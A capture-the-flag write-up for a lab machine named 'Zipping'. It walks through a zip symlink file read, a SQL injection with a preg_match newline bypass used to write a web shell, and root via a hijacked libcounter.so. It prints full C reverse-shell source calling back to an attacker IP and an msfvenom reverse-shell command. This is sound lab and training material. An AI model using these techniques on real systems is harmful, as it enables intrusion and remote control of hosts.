# Zipping

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/53b7cbb5-9dc5-4d05-a458-b3f7cdbf181f)

## 0) Machine Overview




## 1) Scans

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
```

## 2) Web Enumeraton

Nothing really interesting as far as directory bruteforcing goes.
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/7340ca3d-310a-4ee8-8a3b-add880383fec)

Lets begin looking around and manually testing the applications functionality.

Over in the `/upload.php` directory, a file upload form can be found:
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/8df04a8e-b3ae-4162-b097-978ebe471d03)

Seems like its only accepting zip files that contain a pdf.

I tried the following:
- Uploading a .php file.
- Uploading a .zip file containing a .php file.

But those didn't work. However, that's when things started to get interesting. I tried uploading a .zip file containing a .php.pdf file, which it suprisingly accepted. It returns us with an endpoint we can use to access it:

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/712f7e85-6971-4324-8aa5-49dcc871d025)

Now if we access it, we get an error:

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/66a310bb-cc76-4cea-aa0a-c44dba1f7de1)

Now this exploit isn't exactly that, but its similar.
Basically, we can set a symbolic link to a file like `/etc/passwd` and then once our `.pdf` is retrieved/accessed, it will actually retrieve `/etc/passwd`.

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/d2ab29ac-e60b-4579-914f-57e344074f86)

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/522e6823-9b47-44f9-b6b4-cd666feef063)


Then once we upload our file and access it:

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/f4aeb144-1fb7-4e61-87ad-53492133fb6f)


I tried checking if there was an `id_rsa` anywhere, but unfortunately there wasn't.

In the meanwhile,  we can basically read/download all the source code of the website. In specific, there is an interesting file called `cart.php`:

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/6e151ff8-5fbe-4ce9-93c6-f417260d1847)


Its basically telling us its vulnerable to SQLi through those pretty funny comments.

We'll first use this payload just to make sure that our SQLi works: _(Note: the 1 at the end is needed, i'm assuming because once the SQL statement ends with our semicolon, the query is still expecting a number at the end based on the actual functionality of the pgrep_match function that was implemented.)_

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/cae9bc82-aaaa-4940-861c-2129497bb4dd)

Now this payload looks a little confusing at first, but if we look back at the code, it says its filtering from basically all special characters using `pgrep_match()`.

So if we check out this [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match) article, it shows there's a way to bypass it by using `%0a` to basically send the rest of the payload after that character, on a new line. We have to make sure we end with a number, due to the regex that's being used.

From that point, its just testing certain payloads until we get a 302 response.

The reason we have to make it so complicated and have it write out to file is because its an `Out-Of-Band` SQLi. We cant see the results directly listed to us, so we need a way to store it and retrieve it. So for example, in this `PayloadsAllTheThings` note, we can see that it recommends we use that exact payload:

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/42615c46-cb88-40fe-a778-eb6edec1e717)

The only thing that we need to worry about is where we actually want to store the file, and optimally we'd want to be able to retrieve it/access it. So you could try placing it somewhere in the web-root, but if privileges aren't sufficient for that, we can try placing it somewhere like `/var/lib/mysql/`.

Now then, lets see if we can try writing a web-shell payload into a file, then accessing it on the web-server: _(Just keep in mind, stuff like this requires lots of tampering, especially when it comes to special characters.)_

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/55f7a6d5-3b60-4ab0-a7cf-f6d1ff200de9)

Assuming we got the status code response we wanted, we can try executing it now: _(Another note, for some reason we have to remove the file extension, or else it doesn't work.)_

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/ff22dc5e-295e-40c0-b310-24fd72f041d6)

If all goes well, we should receive a request to our python web-server, and then a reverse shell right after.

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/cf2a96a0-c6c3-49ce-85f8-6a137481c86f)

From there, we can just `ssh-keygen -t rsa -b 4096`, and then login via SSH.

## 3)

![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/802a758e-3412-4c96-9ed7-58d4565b5883)

If we run this binary, it just asks us for a password, without much in return. I tried putting a bunch of A's in the chances it could be overflowed, but it wasn't. Also, since the binary is owned by root, we can't even take it offline to analyze it, so we'll have to use whats available to us.

`objdump -x stock`
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/71942d5d-ca5f-4d89-af7b-ce867c563d01)
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/76be9b22-4d28-4318-9e9b-7b76c301eca6)

`ldd stock`
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/4214adef-fac0-4b02-92dc-e5f656680685)

`hexdump -C stock`
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/349fbf98-88c1-4081-a048-355ab0da5b42)

Turns out that ASCII on the right, `St0ckM4nager`, was actually the password to the binary:
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/f98ad92a-193d-4d3c-b560-14a4fcd9cc37)

`strings` gives us a better understanding though:
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/a7e1ca9c-b832-44bd-b9de-d8fa043d8de4)

Now that we have the password, when we run `strace /usr/bin/stock`, and provide the password, it gives us some more output:
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/2d155f11-674d-4f11-86f4-ecdf0ccd4e11)

If we pay close attention, we can see its trying to load a `libcounter.so` file from our users home directory, but that file doesn't exist.

*(Nice [article](https://tbhaxor.com/exploiting-shared-library-misconfigurations/) for compiling syntax and overall shared library misconfigurations)*

_(**NOTE**: A great tip I learnt here is that, in certain situations, you may need to have your function execute before anything else, as that may prevent it from running properly/at all. For example, in this scenario our primary executable/binary `stock` is going to be the one calling for this library, and no matter what I did, it never executed my function for some reason, even though its supposed to called my library. So what we had to do was add `static int main() __attribute__((constructor));`, and that basically told the binary that, the second you get executed, execute me as well.)_

Lets make our own `libcounter.so` file now, containing a reverse shell:

```
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int main() __attribute__((constructor));

int main(void){
    int port = 1234;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.14");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;       
}
```

Then compile it:
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/546ec34b-5f49-4cb6-adbb-840ff59d2792)

Then finally execute the binary with `sudo`.
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/ab69db90-5291-4da7-ae38-acd25aa1013e)

Pwned. 

-----

**Post-Machine Notes:**

In the context of the SQLi, the way you were meant to know that you can write files to the filesystem, was if you analyzed the /var/www/html/functions.php file from the zip file symlink vulnerability, we'd notice that the DB is running as the root db user, which as that user, gives us the ability to write to the file system, usually a good bet is placing it in `/dev/shm` or `/var/lib/mysql`.

Also, you could also have performed a UNION SQLi as well, its not an OOB SQLi like I thought it was, albeit there wasn't much to retrieve from the DB.

Another great tip is, when we want to directly include a reverse shell to get executed, and want to know for sure that the payload is working without being screwed up by URL encoding. we can make sure there are no `+` or `=`, we can do that by adding extra spaces in between the characters like IppSec does here: _(and don't forget to try running it against yourself first as well)_
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/66f569d7-13a7-4295-a7b4-3f18682ff285)

To test it on ourselves:
![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/2241fdf0-ce13-4586-8d37-714f465a592f)

`msfvenom` could have saved me the hassle of trying to get a properly working `libcounter.so` reverse shell, since I had to find out about`__attribute__((constructor))`
do:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf.so -o libcounter.so`



























